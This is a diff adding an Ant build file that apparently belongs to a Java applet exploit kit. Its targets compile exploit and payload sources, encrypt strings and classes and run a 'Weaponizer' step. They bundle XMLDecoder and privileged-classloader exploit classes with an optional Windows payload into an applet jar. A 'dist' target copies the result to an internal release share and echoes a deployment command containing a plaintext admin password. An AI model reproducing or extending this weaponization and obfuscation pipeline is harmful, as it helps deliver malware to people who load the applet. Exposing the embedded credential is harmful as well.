@@ -1,0 +1,231 @@
+<?xml version="1.0"?>
+<project
+    name="migex5"
+    basedir="."
+    default="all" >
+
+    <target name="init" >
+
+        <delete  dir="build"
+            failonerror="false" />
+        <delete  dir="build"
+            failonerror="false" />
+        <mkdir dir="build" />
+        <mkdir dir="build/classes-exploit" />
+        <mkdir dir="build/jar" />
+     </target>
+          
+    <target name="build_exploit" depends="init">
+        <javac
+            debug="true"
+            destdir="build/classes-exploit"
+            source="1.6"
+            srcdir="src-exploit"
+            target="1.6" />
+
+        <mkdir dir="build/classes-payload" />
+
+        <javac
+            debug="true"
+            destdir="build/classes-payload"
+            source="1.6"
+            srcdir="src-payload"
+            target="1.6" />
+
+        <mkdir dir="build/classes-datacreator" />
+
+        <javac
+            classpath="build/classes-exploit;lib/asm-all-3.3.1.jar"
+            debug="true"
+            destdir="build/classes-datacreator"
+            source="1.6"
+            srcdir="src-datacreator"
+            target="1.6" />
+
+        <mkdir dir="build/src-encoded" />
+
+        <mkdir dir="build/src-encoded/x" />
+       </target>
+       
+       
+       <target name="obfuscate_exploit" depends="build_exploit">
+        <java
+            classname="x.StringEncryptor"
+            classpath="build/classes-datacreator;build/classes-exploit"
+            failOnError="true" >
+
+            <arg value="src-exploit/x/EC.java" />
+
+            <arg value="build/src-encoded/x/EC.java" />
+        </java>
+
+        <java
+            classname="x.StringEncryptor"
+            classpath="build/classes-datacreator;build/classes-exploit"
+            failOnError="true" >
+
+            <arg value="src-exploit/x/H.java" />
+
+            <arg value="build/src-encoded/x/H.java" />
+        </java>
+
+        <java
+            classname="x.StringEncryptor"
+            classpath="build/classes-datacreator;build/classes-exploit"
+            failOnError="true" >
+
+            <arg value="src-exploit/x/MCL.java" />
+
+            <arg value="build/src-encoded/x/MCL.java" />
+        </java>
+
+        <java
+            classname="x.StringEncryptor"
+            classpath="build/classes-datacreator;build/classes-exploit"
+            failOnError="true" >
+
+            <arg value="src-exploit/x/XAppletW.java" />
+
+            <arg value="build/src-encoded/x/XAppletW.java" />
+        </java>
+
+        <mkdir dir="build/classes-exploit-enc" />
+
+        <javac
+            classpath="build/classes-exploit"
+            debug="true"
+            destdir="build/classes-exploit-enc"
+            source="1.6"
+            srcdir="build/src-encoded"
+            target="1.6" />
+
+        <copy
+            file="build/classes-exploit-enc/x/EC.class"
+            toDir="build/classes-exploit/x" />
+
+        <copy
+            file="build/classes-exploit-enc/x/H.class"
+            toDir="build/classes-exploit/x" />
+
+        <copy
+            file="build/classes-exploit-enc/x/MCL.class"
+            toDir="build/classes-exploit/x" />
+
+        <copy
+            file="build/classes-exploit-enc/x/XAppletW.class"
+            toDir="build/classes-exploit/x" />
+
+        <java
+            classname="x.InterfaceAdder"
+            classpath="build/classes-datacreator;lib/asm-all-3.3.1.jar"
+            failOnError="true" >
+
+            <arg value="build/classes-exploit/x/Context_close_Caller.class" />
+        </java>
+
+        <java
+            classname="x.Weaponizer"
+            classpath="build/classes-datacreator;build/classes-exploit"
+            failOnError="true" >
+
+            <arg value="build/classes-exploit" />
+            <arg value="build/classes-exploit/x/classes.ser" />
+            <arg value="build/classes-exploit/x/Context_close_Caller.class" />
+            <arg value="build/classes-exploit/x/Context_close_Caller$MyGenericURLContext.class" />
+            <arg value="build/classes-exploit/x/Context_close_Caller$MyNamingEnumeration.class" />
+            <arg value="build/classes-exploit/x/CFT.class" />
+            <!--
+                 arg value="build/classes-exploit/x/Holder.class"/>
+       	      <arg value="build/classes-exploit/x/MyClassLoader.class"/>
+            -->
+
+            <arg value="build/classes-exploit/x/MyHashSet.class" />
+            <arg value="build/classes-exploit/x/MyXMLDecoder.class" />
+            <!-- arg value="build/classes-exploit/x/PrivilegedURLClassLoader.class"/ -->
+        </java>
+
+        <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
+            <arg value="build/classes-exploit/x/PrivilegedURLClassLoader.class" />
+            <arg value="build/classes-exploit/x/puc" />
+        </java>
+
+        <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
+            <arg value="build/classes-exploit/x/PayloadRunner.class" />
+            <arg value="build/classes-exploit/x/pr" />
+        </java>
+        </target>
+        
+        <target name="add_payload_win">
+        <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
+            <arg value="payloads/win" />
+            <arg value="build/classes-exploit/w" />
+        </java>
+        </target>
+        
+         <target name="add_nopayload_win">
+        <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
+            <arg value="payloads/nowin" />
+            <arg value="build/classes-exploit/w" />
+        </java>
+        </target>
+        
+<!--         <java classname="x.ClassEncryptor" classpath="build/classes-datacreator" failOnError="true" >
+            <arg value="payloads/mac" />
+            <arg value="build/classes-exploit/x/m" />
+        </java> -->
+        <target name="delete_files">
+        <delete failonerror="true" >
+            <fileset dir="build/classes-exploit" includes="x/Context_close_Caller.class" />
+            <fileset dir="build/classes-exploit" includes="x/Context_close_Caller$MyGenericURLContext.class" />
+            <fileset dir="build/classes-exploit" includes="x/Context_close_Caller$MyNamingEnumeration.class" />
+            <fileset dir="build/classes-exploit" includes="x/CFT.class" />
+            <!--
+                 fileset dir="build/classes-exploit" includes="x/Holder.class"/>
+       	      <fileset dir="build/classes-exploit" includes="x/MyClassLoader.class"/>
+            -->
+
+            <fileset dir="build/classes-exploit" includes="x/MyHashSet.class" />
+            <fileset dir="build/classes-exploit" includes="x/MyXMLDecoder.class" />
+            <fileset dir="build/classes-exploit" includes="x/PrivilegedURLClassLoader.class" />
+            <fileset dir="build/classes-exploit" includes="x/PayloadRunner.class" />
+            <fileset dir="build/classes-exploit" includes="x/XMLDecoderExploit.class" />
+        </delete>
+        </target>
+
+        <target name="make_jar" depends="delete_files">
+        <jar jarfile="build/jar/x.jar" >
+            <fileset dir="build/classes-exploit" includes="**/*" />
+            <fileset dir="src-exploit" includes="META-INF/**/*" />
+            <fileset dir="src-exploit" includes="**/*.xml" />            
+        </jar>
+        </target>
+        
+        <target name="dist" depends="build_exploit,obfuscate_exploit,add_nopayload_win,make_jar">
+          <copy overwrite="true" todir="server/applet" >
+            <fileset dir="build/jar" />
+          </copy>
+          <zip destfile="server/applet.zip" basedir="server/applet" />
+          <copy file="server/applet.zip" toFile="\\rcs-dev\share\RELEASE\SVILUPPO\cores daVinci\applet.zip" overwrite="true" />
+          <echo>rcs-core -n applet -d zenotto -u admin -p adminp123 -R applet.zip -f1</echo>
+        </target>
+        
+        <target name="test_html" depends="build_exploit,obfuscate_exploit,add_payload_win,make_jar">
+          <copy overwrite="true" todir="html" >
+            <fileset dir="build/jar" />
+          </copy>
+        </target>
+        
+        <target name="all" depends="dist">
+        </target>
+
+<!--        
+<fileset dir="payloads" includes="*"/>
+ <jar
+            basedir="build/classes-payload"
+            includes="**/*.class"
+            jarfile="build/jar/payload.jar" /> -->
+
+
+
+
+</project>
